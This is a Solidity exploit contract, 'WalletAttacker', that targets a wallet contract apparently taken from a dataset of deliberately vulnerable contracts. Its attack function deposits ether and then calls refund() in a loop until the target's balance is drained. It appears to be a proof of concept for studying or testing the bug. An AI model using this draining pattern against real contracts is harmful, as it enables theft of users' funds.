pragma solidity ^0.4.24;

import "../dataset/access_control/wallet_02_refund_nosub.sol";

contract WalletAttacker {
    Wallet public target;

    constructor(Wallet _target) public {
        target = _target;
    }

    function attack() public payable {
        target.deposit.value(msg.value)();


        while (address(target).balance > 0) {
            target.refund();
        }
    }

    function() public payable {}
}